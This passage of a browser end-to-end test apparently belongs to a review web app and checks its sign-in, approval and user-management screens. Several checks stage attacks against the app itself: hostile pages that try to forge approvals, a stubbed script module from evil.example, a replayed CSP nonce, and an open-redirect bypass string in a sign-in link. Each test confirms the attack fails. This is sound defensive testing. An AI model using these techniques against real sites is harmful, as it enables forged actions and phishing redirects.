  // listener: the refusals this provokes are the point, not a failure.
  console.log('a page whose content tries to approve in the reader\'s name:');
  const hostile = await context.newPage();
  await hostile.goto(`${SIGN_IN}/hostile/Z01.html`);
  await must('the panel still builds its buttons on it', () => hostile.locator('.rv-num').first().waitFor());
  await hostile.waitForLoadState('networkidle');
  // What a `<base>` would reach: another host serving a module that forges, with the CORS header a
  // module from elsewhere needs. Stubbed, so the test depends on no network.
  await context.route(/^https:\/\/evil\.example\//, (r) => r.fulfill({
    contentType: 'text/javascript', headers: { 'access-control-allow-origin': '*' }, body: forge('A01.2.2'),
  }));
  await hostile.goto(`${SIGN_IN}/hostile/Z02.html`);
  await hostile.waitForLoadState('networkidle');
  await context.unroute(/^https:\/\/evil\.example\//);
  // A link in any page can lead here; a `<meta http-equiv="refresh">` can lead here with no click.
  await hostile.goto(`${SIGN_IN}/hostile/forge.svg`);
  await hostile.waitForLoadState('networkidle');
  // Anyone who can read a page can read the nonce it was served with, and content is written
  // after pages have been read. A nonce that came back on a later response would be a password
  // printed on every page.
  const seen = (await context.request.get(`${SIGN_IN}/hostile/Z01.html`)).headers()['content-security-policy']
    ?.match(/'nonce-([^']+)'/)?.[1];
  expect('a page is served with a nonce', true, Boolean(seen));
  writeFileSync(join(site, 'hostile', 'Z03.html'),
    hostilePage('Z03', '', `<script nonce="${seen}" src="/hostile/replayed.js"></script>`));
  await hostile.goto(`${SIGN_IN}/hostile/Z03.html`);
  await hostile.waitForLoadState('networkidle');
  const recorded = [];
  for (const page of ['A01', 'A02']) {
    recorded.push(...await context.request.get(`${SIGN_IN}/api/events?page=${page}`).then((r) => r.json()));
  }
  for (const [how, id] of FORGED) {
    expect(`${how} did not approve ${id} in the owner's name`, undefined,
      recorded.find((e) => e.type === 'approval' && e.block === id)?.author);
  }
  await hostile.close();

  // Where a person lands after signing in is decided by the screen's own script, from `next` in the
  // address, and only here does that script run. Without this, its origin check could be removed
  // with every test green, and a link to this sign-in screen would sign people in and hand them to
  // another site. The tab is a spelling a pattern check lets through; the doubled slash is what the
  // origin check itself stands in front of — without it the path `//evil.example/x` is kept, and a
  // path that starts with two slashes names another host.
  console.log('signing in from a link that points away:');
  const lured = await browser.newContext();
  lured.setDefaultTimeout(5000);
  // Both hosts are stubbed: a check that went back to the address as written would land on
  // elsewhere.example, not evil.example, and has to fail here on where it landed rather than on a
  // real network call that never answers.
  await lured.route(/^https?:\/\/(evil|elsewhere)\.example\//, (r) => r.fulfill({ body: 'elsewhere' }));
  const luredPage = await lured.newPage();
  await luredPage.goto(`${SIGN_IN}/sign-in?next=${encodeURIComponent('\thttps://elsewhere.example//evil.example/x')}`);
  await luredPage.locator('#email').fill(OWNER);
  await luredPage.locator('#password').fill(ownersPassword);
  await luredPage.locator('#button').click();
  await must('signing in leaves the sign-in screen', () => luredPage.waitForURL((u) => u.pathname !== '/sign-in'));
  expect('and lands on this site, not the one in the link', SIGN_IN, new URL(luredPage.url()).origin);
  await lured.close();

  // The people screen acts through a script, under the same kind of nonce policy: only a browser
  // running it can show the policy lets it call the API, and that a password appears once.
  // Asking for a page is a plain form on a page that runs no script: only a browser shows that the
  // policy's `form-action 'self'` lets it through, and that the answer lands back on the home.
  console.log('asking for a page from the home, with no script at all:');
  // On a phone, where the form sits well below the fold: the browser reopens the home at the top
  // unless the answer says where to look, and the sentence saying it worked would go unseen.
  await page.setViewportSize({ width: 390, height: 700 });
  await page.goto(`${SIGN_IN}/engine/home`);
  await page.locator('textarea[name="text"]').fill('Explain what a reviewer sees first');
  await page.locator('form.home-ask button[type="submit"]').click();
  await must('the request is recorded, and the home says so', () => page.locator('.holdrim-alert--ok').waitFor());
  expect('where the person can see it, without scrolling', true, await page.locator('.holdrim-alert--ok')
    .evaluate((el) => { const r = el.getBoundingClientRect(); return r.top >= 0 && r.bottom <= globalThis.innerHeight; }));
  await page.setViewportSize({ width: 1280, height: 720 });
  await must('and lists it with the others', () => page.getByText('Explain what a reviewer sees first').first().waitFor());
  expect('and nothing was refused on the way', '', problems.join(' | '));

  console.log('the people screen, under its own policy:');
  await page.goto(`${SIGN_IN}/engine/home`);
  await page.locator('nav a[href="/engine/people"]').click();
  await must('the owner reaches it from the home', () => page.locator('#create').waitFor());
  page.on('dialog', (d) => d.accept());
  await page.locator('#create input[name="name"]').fill('Someone New');
  await page.locator('#create input[name="email"]').fill('new@example.org');
  await page.locator('#create button[type="submit"]').click();
  await must('creating an access shows its password, once', () => page.locator('#once code').waitFor());
  expect('a real password, not an empty box', true, (await page.locator('#once code').textContent()).length >= 12);
  // Only a new access is said to join the list later; a reset is for somebody the list already shows.
  const onceNew = JSON.parse(readFileSync(join(ROOT, 'engine', 'locales', 'en.json'), 'utf8'))['people.onceNew'];
  expect('and it says when the new person joins the list', true, (await page.locator('#once').textContent()).includes(onceNew));
  await page.reload();
  await must('and after a reload the password is gone', () => page.locator('#once').waitFor({ state: 'hidden' }));
  await page.locator('button[data-action="reset"][data-email="new@example.org"]').click();
  await must('a new password for somebody already listed shows once too',
    () => page.locator('#once', { hasText: 'new@example.org' }).locator('code').waitFor());
  expect('without saying they join the list later', false, (await page.locator('#once').textContent()).includes(onceNew));

  const create = async (name, email) => {
    await page.locator('#create input[name="name"]').fill(name);
    await page.locator('#create input[name="email"]').fill(email);
    await page.locator('#create button[type="submit"]').click();
  };
  // The refusals below are asked for on purpose, and the browser logs each one as a failed request.
  // They are set aside here, and only these: anything else logged meanwhile still fails the check.
  const deliberate = problems.length;
  await create('Someone Again', 'new@example.org');
  await must('an address already here is refused, and the screen says so', () => page.locator('#error').waitFor());
  await create('Someone Else', 'else@example.org');
  await must('and the next success clears that error', () => page.locator('#error').waitFor({ state: 'hidden' }));
  await must('while showing its own password', () => page.locator('#once code').waitFor());
  // A 200 whose body cannot be read is not a success with nothing in it: the screen must not show an
  // empty password under "shown this once".
  await page.route('**/api/users', (route) => route.fulfill({ status: 200, contentType: 'application/json', body: 'cut off' }));
  await page.reload();
  await create('Nobody', 'nobody@example.org');
  await must('an answer that cannot be read is reported, not shown as a blank password',
    () => page.locator('#error').waitFor());
  expect('and no password box appears', false, await page.locator('#once').isVisible());
  await page.unroute('**/api/users');
  const unexpected = problems.splice(deliberate).filter((p) => !/status of 400 \(Bad Request\)/.test(p));
  problems.push(...unexpected);
  await page.reload();
  await page.locator('button[data-action="disable"][data-email="new@example.org"]').click();
  await must('taking the access away redraws the row with it gone',
    () => page.locator('button[data-action="enable"][data-email="new@example.org"]').waitFor());
  // On a phone the list is a stack of cards, not a table wider than the screen: five columns with
  // their buttons would push the whole page sideways.
  await page.setViewportSize({ width: 390, height: 800 });
  expect('on a phone the people screen does not scroll sideways', true,
    await page.evaluate(() => globalThis.document.documentElement.scrollWidth <= globalThis.innerWidth));
  await page.setViewportSize({ width: 1280, height: 900 });
  expect('and nothing was refused on the way', '', problems.join(' | '));
} catch (e) {
  console.log(`  FAIL ${e.message}`);
  failures++;
} finally {
  await cleanUp();
}

console.log(failures ? `\n${failures} failure(s)` : '\nall good');
process.exit(failures ? 1 : 0);
